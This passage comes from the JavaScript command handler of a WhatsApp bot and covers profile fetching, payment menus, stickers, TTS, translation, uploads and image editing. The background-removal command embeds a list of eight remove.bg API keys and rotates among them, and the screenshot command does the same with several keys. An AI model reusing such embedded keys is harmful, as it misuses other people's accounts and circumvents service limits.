	if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Please tag the person, Kak!`)
	let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
	try {
		avatar = await sock.profilePictureUrl(users, "image")
	} catch {
		avatar = 'https://8030.us.kg/file/P2LpaOHxWlJt.jpg'
	}
	try {
		sock.sendMessage(m.chat, {
			image: {
				url: avatar
			},
			caption: mess.done
		}, {
			quoted: m
		})
	} catch (error) {
		console.log(error);
		newReply('Failed during action, if you are the owner please check console.');
	};
}
break

case 'getppgc': {
	if (!isPremium) return newReply(mess.premium);
	if (!m.isGroup) return newReply(mess.group);
	try {
		avatar = await sock.profilePictureUrl(m.chat, "image")
	} catch {
		avatar = 'https://8030.us.kg/file/P2LpaOHxWlJt.jpg'
	}
	try {
		sock.sendMessage(m.chat, {
			image: {
				url: avatar
			},
			caption: mess.done
		}, {
			quoted: m
		})
	} catch (error) {
		console.log(error);
		newReply('Failed during action, if you are the owner please check console.');
	};
}
break

case 'getname': {
	if (!isPremium) return newReply(mess.premium);
	if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Please tag the person, Kak!`)
	let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
	try {
		let name = sock.getName(users);
		newReply(name);
	} catch (error) {
		console.log(error);
		newReply('Failed during action, if you are the owner please check console.');
	};
}
break

case 'getnamegc':
case 'getsubject': {
	if (!isPremium) return newReply(mess.premium);
	if (!m.isGroup) return newReply(mess.group)
	try {
		newReply(groupName);
	} catch (error) {
		console.log(error);
		newReply('Failed during action, if you are the owner please check console.');
	};
};
break

case 'getdesk':
case 'metadatadesc':
case 'getdesc': {
	if (!isPremium) return newReply(mess.premium);
	if (!m.isGroup) return newReply(mess.group);
	try {
		newReply(groupMetadata.desc)
	} catch (error) {
		console.log(error);
		newReply('Failed during action, if you are the owner please check console.');
	};
};
break

case 'editinfo': {
	if (!m.isGroup) return newReply(mess.group);
	if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin);
	if (!isBotAdmins) return newReply(mess.botAdmin);
	if (args[0] === 'open') {
		await sock.groupSettingUpdate(m.chat, 'unlocked')
			.then(() => newReply('✅ Members can now edit group info! 📛✨'))
			.catch((err) => newReply(`⚠️ Failed to open group info edit permission: ${err}`));
	} else if (args[0] === 'close') {
		await sock.groupSettingUpdate(m.chat, 'locked')
			.then(() => newReply('✅ Only admins can edit group info now! 🔒🛡️'))
			.catch((err) => newReply(`⚠️ Failed to close group info edit permission: ${err}`));
	} else {
		newReply(`⚙️ Command usage:\n · *${prefix + command} open* → Allow members to edit group info\n · *${prefix + command} close* → Only admins can edit group info`);
	}
}
break;

case 'linkgroup':
case 'linkgrup':
case 'linkgc':
case 'gclink':
case 'grouplink':
case 'gruplink':
case 'invitecode':{
	if (!m.isGroup) return newReply('This command can only be used in a group.');
	try {
		const inviteCode = await groupInviteCode(m.chat);
		newReply(`Group invite code:\nhttps://chat.whatsapp.com/${inviteCode}`);
	} catch (err) {
		console.error(err);
		newReply('Failed to get group invite code.');
	}
}
break;

case 'speedtest': case 'speed': {
	if (!isCreator) return newReply(mess.owner);
	let cp = require('child_process');
	let { promisify } = require('util');
	let exec = promisify(cp.exec).bind(cp);
	let o
		try {
			o = await exec('python3 speed.py');
		} catch (e) {
			o = e
		} finally {
			let { stdout, stderr } = o
			if (stdout.trim()) newReply(stdout);
			if (stderr.trim()) newReply(stderr);
		}
	}
break;

case 'pay':
case 'payment': {
	let button = [{
		"name": "single_select",
		"buttonParamsJson": `{
			"title": "Payment Methods",
			"sections": [
				{
					"title": "Select Payment Method",
					"rows": [
						{
							"header": "💳 Dana",
							"title": "Dana - Select for details",
							"id": "${prefix}paymethod dana"
						},
						{
							"header": "💵 GoPay",
							"title": "GoPay - Select for details",
							"id": "${prefix}paymethod gopay"
						},
						{
							"header": "📱 OVO",
							"title": "OVO - Select for details",
							"id": "${prefix}paymethod ovo"
						},
						{
							"header": "🔗 QRIS",
							"title": "QRIS - Select for details",
							"id": "${prefix}paymethod qris"
						},
						{
							"header": "🛍️ ShopeePay",
							"title": "ShopeePay - Select for details",
							"id": "${prefix}paymethod shopeepay"
						},
						{
							"header": "🏦 SeaBank",
							"title": "SeaBank - Select for details",
							"id": "${prefix}paymethod seabank"
						}
					]
				}
			]
		}`
	}];
	sock.sendButtonText(
		m.chat,
		button,
		"Please select a payment method below to continue the transaction:",
		"Payment Methods",
		m
	);
}
break;

case 'paymethod': {
	if (!args[0]) {
		newReply(`Please select a payment method:\n\n💳 *Dana*: ${prefix + command} dana\n💵 *GoPay*: ${prefix + command} gopay\n📱 *OVO*: ${prefix + command} ovo\n🔗 *QRIS*: ${prefix + command} qris\n🛍️ *ShopeePay*: ${prefix + command} shopeepay\n🏦 *SeaBank*: ${prefix + command} seabank`);
	} else {
		switch (args[0].toLowerCase()) {
			case 'dana':
				newReply(`💳 *Dana*\n\nPlease transfer to the following number:\n*${payment.dana}*\n\nAfter transferring, send the payment proof here.`);
				break;
			case 'gopay':
				newReply(`💵 *GoPay*\n\nPlease transfer to the following number:\n*${payment.gopay}*\n\nAfter transferring, send the payment proof here.`);
				break;
			case 'ovo':
				newReply(`📱 *OVO*\n\nPlease transfer to the following number:\n*${payment.ovo}*\n\nAfter transferring, send the payment proof here.`);
				break;
			case 'qris':
				let paymentBuffer = await getBuffer(`${payment.qris}`);
				await newReply(`🔗 *QRIS*\n\nScan the following QR code to make payment:`);
				m.reply({ image: paymentBuffer, caption: "Scan this QR for payment." })
				break;
			case 'shopeepay':
				newReply(`🛍️ *ShopeePay*\n\nPlease transfer to the following number:\n*${payment.shopeePay}*\n\nAfter transferring, send the payment proof here.`);
				break;
			case 'seabank':
				newReply(`🏦 *SeaBank*\n\nPlease transfer to the following account number:\n*${payment.seabank}*\n\nAfter transferring, send the payment proof here.`);
				break;
			default:
				newReply(`Invalid payment method. Choose one from:\n\n💳 *Dana*\n💵 *GoPay*\n📱 *OVO*\n🔗 *QRIS*\n🛍️ *ShopeePay*\n🏦 *SeaBank*`);
		}
	}
};
break;

case 'tes':
case 'test': {
	m.reply({
		text: 'This is the text in the title section.',
		footer: 'This is the text in the footer section.',
		buttons: [
			{
				buttonId: `.me`,
				buttonText: { displayText: "🙂" }
			},
			{
				buttonId: `.me`,
				buttonText: { displayText: "😐" }
			},
			{
				buttonId: `.me`,
				buttonText: { displayText: "☹️" }
			}
		],
		viewOnce: true
	});
}
break;

case 'owner':
case 'creator': {
	await sock.sendMessage(
		m.chat, 
		{
			contacts: {
				displayName: ownerName,
				contacts: contacts
			}
		}, {
			quoted: m
		}
	);
}
break;

case 'brat':
case 'anomali': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!text) return newReply(`Example : ${prefix + command} Hi Kak`)
	if (text.length > 101) return newReply(`Limited characters, max 100!`)
	let caption = 'Choose the *brat* type you like, there are several types! Click the *button* below, Kak! 😋👇';
	m.reply({
		text: caption,
		footer: footer,
		buttons: [
			{
				buttonId: `${prefix}bratgambar ${text}`,
				buttonText: { displayText: "Image" }
			},
			{
				buttonId: `${prefix}bratvideo ${text}`,
				buttonText: { displayText: "Video" }
			}
		],
		viewOnce: true
	});
}
break;

case 'bratgambar': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (m.sender in enhance) return newReply(`There is still an unfinished process, please wait until it's complete.`);	
	if (!text) return newReply(`Example : ${prefix + command} Hi Kak`);
	if (text.length > 101) return newReply(`Limited characters, max 100!`);
	enhance[m.sender] = true;
	await m.react('⏱️');
	try {
		const buffer = await getBuffer(`https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}`);
		await m.react('✅');
		sock.sendImageAsSticker(m.chat, buffer, m, { packname: botName, author: ownerName });
	} catch (err) {
		newReply('An error occurred while creating the image sticker. 😞');
	}
	delete enhance[m.sender];
	db.data.users[m.sender].limit -= 1;
	break;
}

case 'bratvideo': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!isPremium) return newReply(mess.premium);
	if (m.sender in enhance) return newReply(`There is still an unfinished process, please wait until it's complete.`);
	if (!text) return newReply(`Example : ${prefix + command} Hi Kak`);
	if (text.length > 101) return newReply(`Limited characters, max 100!`);
	enhance[m.sender] = true;
	const words = text.split(" ");
	const tempDir = path.join(process.cwd(), 'temp');
	if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
	const framePaths = [];
	await m.react('⏱️');
	try {
		for (let i = 0; i < words.length; i++) {
			const currentText = words.slice(0, i + 1).join(" ");
			const res = await axios.get(`https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(currentText)}`, { responseType: "arraybuffer" }).catch((e) => e.response);
			const framePath = path.join(tempDir, `frame${i}.mp4`);
			fs.writeFileSync(framePath, res.data);
			framePaths.push(framePath);
		}
		const fileListPath = path.join(tempDir, "filelist.txt");
		let fileListContent = "";
		for (let i = 0; i < framePaths.length; i++) {
			fileListContent += `file '${framePaths[i]}'\n`;
			fileListContent += `duration 0.7\n`;
		}
		fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`;
		fileListContent += `duration 2\n`;
		fs.writeFileSync(fileListPath, fileListContent);
		const outputVideoPath = path.join(tempDir, "output.mp4");
		await execSync(`ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset ultrafast -pix_fmt yuv420p ${outputVideoPath}`);
		await m.react('✅');
		await sock.sendImageAsSticker(m.chat, outputVideoPath, m, {
			packname: botName,
			author: ownerName
		});
		framePaths.forEach((frame) => {
			if (fs.existsSync(frame)) fs.unlinkSync(frame);
		});
		if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath);
		if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath);
	} catch (e) {
		console.error(e);
		newReply(mess.error);
	}
	delete enhance[m.sender];
	db.data.users[m.sender].limit -= 1;
	break;
}

case 'ssw':
case 'ssweb': {
	if (!isPremium) return newReply(mess.premium);
	if (!args[0]) return newReply(
		`📸 *How to Use Web Screenshot!*\n\n` +
		`Use command: ${prefix + command} <type> <web url>\n\n` +
		`📌 *Available types:*\n` +
		` ⌬ 📱 hp → Mobile view\n` +
		` ⌬ 💻 pc → Desktop view\n` +
		` ⌬ 📟 tab → Tablet view\n\n` +
		`🔍 *Example usage:*\n` +
		`${prefix + command} hp https://www.ryzenoffc.my.id`
	);

	if (!args[1]) return newReply(
		`⚠️ *URL cannot be empty!*\n\n` +
		`Use format: ${prefix + command} <type> <web url>\n\n` +
		`💡 *Example:*\n${prefix + command} hp https://www.ryzenoffc.my.id`
	);

	const key = await pickRandom(["1b484c", "965abb", "731a82", "194174"]);

	let deviceType, dimension, deviceName;

	if (args[0] === 'hp') {
		deviceType = "phone";
		dimension = "480x800";
		deviceName = "📱 Mobile View";
	} else if (args[0] === 'pc') {
		deviceType = "desktop";
		dimension = "1024x768";
		deviceName = "💻 Desktop View";
	} else if (args[0] === 'tab') {
		deviceType = "tablet";
		dimension = "800x1280";
		deviceName = "📟 Tablet View";
	} else {
		return newReply(
			`❌ *Type not recognized!*\n\n` +
			`Use one of the following types:\n` +
			` ⌬ 📱 hp\n ⌬ 💻 pc\n ⌬ 📟 tab\n\n` +
			`💡 *Example:*\n${prefix + command} hp https://www.ryzenoffc.my.id`
		);
	}
	                 				if (db.data.users[m.sender].limit < 1) {
					return newReply(
						`⛔ *Limit empty!*\n` +
						`Please contact the bot owner to get additional limit.\n\n` +
						`📞 *Owner:* ${ownnomor}`
					);
				}

				await m.react('📸');
	
				try {
					await sock.sendMessage(m.chat, {
						image: {
							url: `https://api.screenshotmachine.com/?key=${key}&url=${args[1]}&device=${deviceType}&dimension=${dimension}&format=png&cacheLimit=0&delay=1000`
						},
						caption: 
							`✅ *Screenshot Successful!*\n\n` +
							`🔗 *URL:* ${args[1]}\n` +
							`📌 *Type:* ${deviceName}\n` +
							`⏳ *Processing time:* ${latensi.toFixed(4)}s\n\n` +
							`🚀 Screenshot ready to use!`
					}, { quoted: m });
				} catch (error) {
					console.error(error);
					newReply("❌ Failed to take screenshot! Make sure the given URL is correct or try again later.");
				}
			}
			break;

			case 'quotechat':
			case 'quote':
			case 'qc':{
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply('Input the text!')
				const sender = m.sender
				const username = await sock.getName(m.quoted ? m.quoted.sender : sender)
				const avatar = await sock.profilePictureUrl(m.quoted ? m.quoted.sender : sender, "image").catch(() => 'https://8030.us.kg/file/P2LpaOHxWlJt.jpg')
				const json = {
					type: "quote",
					format: "png",
					backgroundColor: "#FFFFFF",
					width: 300,
					height: 400,
					scale: 2,
					"messages": [
						{
							"entities": [],
							"avatar": true,
							"from": {
								"id": 1,
								"name": username,
								"photo": {
									"url": avatar
								}
							},
							"text": text,
							"replyMessage": {}
						}
					],
				};
				axios.post("https://bot.lyo.su/quote/generate", json, {
					headers: {"Content-Type": "application/json"},
				})
				.then(async (res) => {
					const buffer = Buffer.from(res.data.result.image, "base64");
					let encmedia = await sock.sendImageAsSticker(m.chat, buffer, m, { packname: botName, author: ownerName, categories: ['🤩', '🎉'], id: '12345', quality: 100, background: 'transparent'})
					await fs.unlinkSync(encmedia)
				})
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'quotecolor': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply('Input the text!')
				const sender = m.sender;
				const username = await sock.getName(m.quoted ? m.quoted.sender : sender);
				const avatar = await sock.profilePictureUrl(m.quoted ? m.quoted.sender : sender, "image").catch(() => 'https://8030.us.kg/file/P2LpaOHxWlJt.jpg');	
				// Separate text and background color if exists
				const parts = text.split(' ');
				const hexColor = /^#[0-9A-F]{6}$/i.test(parts[parts.length - 1]) ? parts.pop() : "#FFFFFF"; // Take background color if exists
				const customText = parts.join(' '); // Text to be used
				// Check if background color is valid
				if (!/^#[0-9A-F]{6}$/i.test(hexColor)) {
					return newReply('Invalid background color! Use hex format like #FF5733.');
				}
				const json = {
					type: "quote",
					format: "png",
					backgroundColor: hexColor, // Using customized color
					width: 512,
					height: 512,
					scale: 2,
					"messages": [
						{
							"entities": [],
							"avatar": true,
							"from": {
								"id": 1,
								"name": username,
								"photo": {
									"url": avatar
								}
							},
							"text": customText, // Using processed text
							"replyMessage": {}
						}
					],
				};
				try {
					// Send request to create image with quote
					const res = await axios.post("https://bot.lyo.su/quote/generate", json, {
						headers: { "Content-Type": "application/json" },
					});
					// Save received image and send as sticker
					const buffer = Buffer.from(res.data.result.image, "base64");
					let encmedia = await sock.sendImageAsSticker(m.chat, buffer, m, { 
						packname: botName, 
						author: ownerName, 
						categories: ['🤩', '🎉'], 
						id: '12345', 
						quality: 100, 
						background: 'transparent'
					});
					// Delete temporary file after use
					await fs.unlinkSync(encmedia);
				} catch (err) {
					// Handle error if there's an issue with request or image sending
					console.error(err);
					newReply("❌ An error occurred while processing the request. Try again later!");
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'sticker':
case 'stiker':
case 's': {
if (!/image|video/gi.test(mime)) return m.reply("with media sent")
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Video duration maximum 15 seconds!")
var image = await sock.downloadAndSaveMediaMessage(qmsg)
await sock.sendImageAsSticker(m.chat, image, m, {packname: foother})
await fs.unlinkSync(image)
sock.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}

break;

			case 'swm': case 'steal': case 'stickerwm': case 'take': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(`Oh no, Kak, your limit is empty! 🥲 Try upgrading to premium!`);
				if (!isPremium) return newReply(mess.premium);
				if (!quoted) return newReply(`Send or reply to image/video/gif with caption ${prefix + command}\nVideo duration 1-9 seconds please!`);
				if (!mime) return newReply(`Send or reply to image/video/gif with caption ${prefix + command}\nVideo duration 1-9 seconds please!`);
				const swn = args.join(" ");
				const pcknm = swn.split("|")[0];
				const atnm = swn.split("|")[1];
				if (m.quoted.isAnimated === true) {
					let media = await sock.downloadAndSaveMediaMessage(quoted);
					sock.sendMessage(m.chat, { 
						sticker: media 
					}, m, { 
						packname: pcknm, 
						author: atnm 
					});
				} else if (/image/.test(mime)) {
					let media = await sock.downloadAndSaveMediaMessage(quoted);
					await sock.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm });
				} else if (/video/.test(mime)) {
					if ((quoted.msg || quoted).seconds > 9) return newReply('Video too long, maximum 9 seconds please! ⏳');
					let media = await sock.downloadAndSaveMediaMessage(quoted);
					await sock.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm });
				} else {
					newReply(`Send photo/video to use, Kak!`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'smeme': case 'stickermeme': case 'stickmeme': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(`Limit empty, Kak! Try upgrading premium to continue!`);
				if (!isPremium) return newReply(mess.premium);
				if (!/webp/.test(mime) && /image/.test(mime)) {
					if (!text) return newReply(`Usage: ${prefix + command} top_text|bottom_text`);
					atas = text.split('|')[0] ? text.split('|')[0] : '';
					bawah = text.split('|')[1] ? text.split('|')[1] : '';
					let mee = await sock.downloadAndSaveMediaMessage(quoted);
					let mem = await CatBox(mee);
					let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`;
					await sock.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author });
				} else {
					newReply(`Send or reply to image with caption ${prefix + command} top_text|bottom_text to create a meme!`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'ttsbluearchive':
			case 'ttsba': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply('Aww, sorry Kak, your limit is empty. If you want more, try upgrading to premium! 😘');
				if (!isPremium) return newReply('This feature is only for premium users, try upgrading first so I can help more! 😇');
				if (!text) return newReply(`Hmm, seems something is missing, try this Kak:\n${prefix + command} I like fried rice,momoi`);
				try {
					let [message, char, speed] = text.split(',');
					if (!message || !char) return newReply(`Let's try again Kak! Example like this:\n${prefix + command} I like fried rice,momoi`);

					const suppVoice = [
						'airi', 'akane', 'akari', 'ako', 'aris', 'arona', 'aru', 'asuna', 'atsuko', 'ayane', 
						'azusa', 'cherino', 'chihiro', 'chinatsu', 'chise', 'eimi', 'erica', 'fubuki', 'fuuka', 
						'hanae', 'hanako', 'hare', 'haruka', 'haruna', 'hasumi', 'hibiki', 'hihumi', 'himari', 
						'hina', 'hinata', 'hiyori', 'hoshino', 'iori', 'iroha', 'izumi', 'izuna', 'juri', 
						'kaede', 'karin', 'kayoko', 'kazusa', 'kirino', 'koharu', 'kokona', 'kotama', 
						'kotori', 'main', 'maki', 'mari', 'marina', 'mashiro', 'michiru', 'midori', 'miku', 
						'mimori', 'misaki', 'miyako', 'miyu', 'moe', 'momoi', 'momoka', 'mutsuki', 'NP0013', 
						'natsu', 'neru', 'noa', 'nodoka', 'nonomi', 'pina', 'rin', 'saki', 'saori', 'saya', 
						'sena', 'serika', 'serina', 'shigure', 'shimiko', 'shiroko', 'shizuko', 'shun', 
						'ShunBaby', 'sora', 'sumire', 'suzumi', 'tomoe', 'tsubaki', 'tsurugi', 'ui', 'utaha', 
						'wakamo', 'yoshimi', 'yuuka', 'yuzu', 'zunko'
					];
					if (!suppVoice.includes(char.toLowerCase())) {
						const txtVoice = suppVoice
							.map(name => name.charAt(0).toUpperCase() + name.slice(1))
							.sort()
							.map(name => `- ${name}`)
							.join('\n');
						return newReply(`Hmm, the character you chose isn't available! 😢\nTry choosing one from this list:\n\n${txtVoice}`);
					}
					newReply('Wait a moment Kak, I'm processing now! 🥰');	
					const ba = new BlueArchive();
					const translated = await translate(message, { to: 'ja', autoCorrect: false });
					const result = await ba.voice(translated[0], char.charAt(0).toUpperCase() + char.slice(1), speed || 1);
					sock.sendMessage(m.chat, { audio: { url: result.result.url }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
				} catch (err) {
					console.error(err);
					newReply('Oh no Kak, there's an error, sorry so much! Try again later! 😔');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'tts':
			case 'texttosound':
			case 'audio':
			case 'say': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply('Aww, sorry Kak, your limit is empty. If you want more, try upgrading to premium! 🥺');
				if (!isPremium) return newReply('This feature is only for premium Kak, try upgrading first to access everything! 😇');
				if (!text) return newReply(`How to use like this Kak:\n${prefix + command} text\n\n*Send command*: ${prefix + command} yaya 😁`);
				let lang = text.split("--")[1];
				try {
					if (!lang) lang = 'id'; // Default language
					long = 'id';
					function tts(text, long = 'id') {
						return new Promise((resolve, reject) => {
							try {
								let tts = gtts(long);
								let filePath = path.join(__dirname, './temp', (1 * new Date) + '.wav');
								tts.save(filePath, text, () => {
									resolve(fs.readFileSync(filePath));
									fs.unlinkSync(filePath);
								});
							} catch (e) {
								reject(e);
							}
						});
					}
					let res;
					try {
						res = await tts(text, long);
					} catch (e) {
						newReply('Hmm, something's wrong here, try again! 🥲');
						res = await tts(text);
					} finally {
						const sendAudio = {
							audio: res,
							mimetype: 'audio/mpeg'
						};
						if (/say/.test(command)) sendAudio.ptt = true; // Voice note mode
						sock.sendMessage(m.chat, sendAudio, { quoted: m });
					}
				} catch (error) {
					console.log(error);
					newReply('Oh no Kak, error here. I didn't mean to, please try again! 🙏');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'translate':
			case 'tr': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply('Aww, your limit is empty. Try upgrading premium, so you can be freer! 😊');
				if (!text) return newReply(`Kak, how to use it like this:\n\n1. Send command ${prefix + command} *language code* *message*\n•*Send command*: ${prefix + command} id Hello\n\n2. Reply to chat with caption ${prefix + command} *language code*\n•*Send command*: ${prefix + command} en hi\n\nFull language list can be checked here Kak: https://cloud.google.com/translate/docs/languages`);
				try {
					let message = m.quoted ? m.quoted.text : text.split(args[0])[1];
					if (!message) return newReply('Hmm, seems the text is incomplete Kak. Please check again! 🧐');
					const result = await translate(message, { to: args[0] });
					newReply(`Translation result:\n\n${result.text} 😊`);
				} catch (error) {
					console.log(error);
					newReply('Aww, I accidentally caused an error Kak. Please try again! 🙏');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'tourl': {
				let captionText = `Hello Kak ${pushname}! 🎉\n\nCurrently, only server *8030* is active for uploading images.\n\nSelect server *8030* to upload your image. Choose one of the options below! 🌟`;
				let button = [{
					"name": "single_select",
					"buttonParamsJson": `{
						"title": "Select Server for Upload",
						"sections": [{
							"title": "Select Server",
							"rows": [{
								"header": "Catbox",
								"title": "Upload to Catbox server! 🐱",
								"id": "${prefix}uploadcatbox"
							},
							{
								"header": "8030",
								"title": "Upload to server 8030! 🎞️",
								"id": "${prefix}uploadfile"
							},
							{
								"header": "Telegraph",
								"title": "Upload to Telegraph server! 🌐",
								"id": "${prefix}uploadtelegraph"
							},
							{
								"header": "Pomf",
								"title": "Upload to Pomf server! 🔥",
								"id": "${prefix}uploadpomf"
							},
							{
								"header": "GitHub",
								"title": "Upload to GitHub server! 💻",
								"id": "${prefix}uploadgithub"
							},
							{
								"header": "ImgBB",
								"title": "Upload to ImgBB server! 🖼️",
								"id": "${prefix}uploadimgbb"
							},
							{
								"header": "TinyURL",
								"title": "Upload to TinyURL server! 🌍",
								"id": "${prefix}uploadtinyurl"
							}]
						}]
					}`
				}];
				sock.sendButtonText(m.chat, button, captionText, footer, m);
			}
			break;

			case 'uploadcatbox': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!mime) return newReply(`Send/Reply Video/Image With Caption ${prefix + command}`);
				await m.react('⏱️');
				try {
					let media = await sock.downloadAndSaveMediaMessage(quoted);
					if (/image|video/.test(mime)) {
						let data = await CatBox(media);
						let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
						let uploadDate = new Date().toLocaleString();
						let uploader = m.pushName;
						let caption = `🔗 *Media Link*: ${data}\n📅 *Upload Date*: ${uploadDate}\n📂 *File Size*: ${fileSize} KB\n👤 *Uploader*: ${uploader}`.trim();
						newReply(caption);
					} else if (!/image/.test(mime)) {
						let data = await CatBox(media);
						await newReply(data);
					} else {
						newReply(`Media type not supported!`);
					}
					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					newReply("Oops, an error occurred while uploading media. Try again! 😅");
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'uploadfile': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply("This feature is only for premium users, Kak! Upgrade now to use this feature 😊.");
				if (!mime) return newReply(`Send/Reply Video/Image With Caption ${prefix + command}`);
				await m.react('⏱️');
				try {
					let media = await sock.downloadAndSaveMediaMessage(quoted);
					if (/image|video/.test(mime)) {
						let data = await uploadFile(media);
						let resultUrl = data;
						if (resultUrl) {
							let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
							let uploadDate = new Date().toLocaleString();
							let uploader = m.sender.replace('@s.whatsapp.net','');
							let caption = `🔗 *Media Link*: ${resultUrl}\n📅 *Upload Date*: ${uploadDate}\n📂 *File Size*: ${fileSize} KB\n👤 *Uploader*: @${uploader}`.trim();
							newReply(caption);
						} else {
							newReply("Failed to get URL from server.");
						}
					} else {
						newReply(`Media type not supported!`);
					}
					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					newReply("Oops, an error occurred while uploading media. Try again! 😅");
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'toimage': 
			case 'toimg': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!quoted) return newReply('Reply Image')
				if (!/webp/.test(mime)) return newReply(`Reply sticker with caption *${prefix + command}*`)
				await m.react('⏱️');
				let media = await sock.downloadAndSaveMediaMessage(quoted)
				let ran = await getRandom('.png')
				exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) throw err
					let buffer = fs.readFileSync(ran)
					sock.sendMessage(m.chat, { image: buffer }, { quoted: m })
					fs.unlinkSync(ran)
				})
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'imageupscaler':
			case 'imageup':
			case 'upscale':
			case 'upimg':
			case 'hdr':
			case 'hd': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (m.sender in enhance) return newReply(`There is still an unfinished process, please wait until it's complete.`);
				let q = m.quoted ? m.quoted : m;
				let mime = (q.msg || q).mimetype || q.mediaType || "";
				if (!mime) return newReply(`Send/Reply Image With Caption ${prefix + command}`);
				if (!/image\/(jpe?g|png)/.test(mime)) 
					return newReply(`Media not supported!`);
				enhance[m.sender] = true;
				try {
					const availableScales = [2, 4, 6];
					await m.react('⏱️');
					let media = await q.download();
					let scale = availableScales.includes(parseInt(text)) ? parseInt(text) : 2;
					let tag = `@${m.sender.split("@")[0]}`;		
					let result = await upscale(media, scale);
					let caption = "🌟 *Effect*: HD\n";
					caption += `📩 *Requested by*: ${tag}\n`;
					caption += `✨ *Source*: imageupscaler.com\n`;
					caption += `🔍 *Scale*: ${scale}\n`;
					caption += `📏 *Available Scales*: ${availableScales.join(", ")}\n\n`;
					caption += "Thank you for using this feature, Kak! 😊";
					await m.react('✅');
					await sock.sendMessage(m.chat, {
						image: { url: result },
						caption: caption,
						mentions: [m.sender]
					}, { 
						quoted: m 
					});
				} catch (error) {
					console.error(error);
					newReply("❌ Oops, an error occurred while processing the image. Try again later, Kak!");
				}
				delete enhance[m.sender];
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'nobg':
			case 'imagenobg':
			case 'removebg':
			case 'remove-bg': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!/image/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`);
				if (/webp/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`);
				let remobg = require('remove.bg');
				let apirnobg = ["pvmbuSzyrip1ksmj9otVSogd", "jGaBWNXPP8LXV6KW3ovBWozE", "kqWaDsZLxMk2kh9MJu5u7ceP", "kDhVMX7eoByik5hFomEdMDVs", "c7J5ityXePPqxARTMRpohJvj","xu2pZRhdyddJx48BrN9ntvjD","FAKQ7AtfrADtGmLsWVG9s9Yu","3eoq8Bd1JUxEU3Gi5AAmtxZ1"]
				try {
					let apinobg = await pickRandom(apirnobg)
					hmm = await 'remobg-' + getRandom('')
					localFile = await sock.downloadAndSaveMediaMessage(quoted, hmm)
					outputFile = await './temp/hremo-' + getRandom('.png')
					await remobg.removeBackgroundFromImageFile({
						path: localFile,
						apiKey: apinobg,
						size: "regular",
						type: "auto",
						scale: "100%",
						outputFile
					}).then(async result => {
						sock.sendMessage(m.chat, {  
						image: fs.readFileSync(outputFile),
				caption: mess.done
			}, {
				quoted: m
			})
			await fs.unlinkSync(localFile)
			await fs.unlinkSync(outputFile)
		})
	} catch (error) {
		console.log(error);
		newReply('Failed during action, if you are the owner please check console.');
	};
}
db.data.users[m.sender].limit -= 1;
break

case 'resize': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!isPremium) return newReply(mess.premium);
	if (!q) return newReply(`Enter length x width dimensions, example ${prefix + command} 300x300`)
	await m.react('⏳');
	let panjang = q.split('x')[0];
	let lebar = q.split('x')[1];
	try {
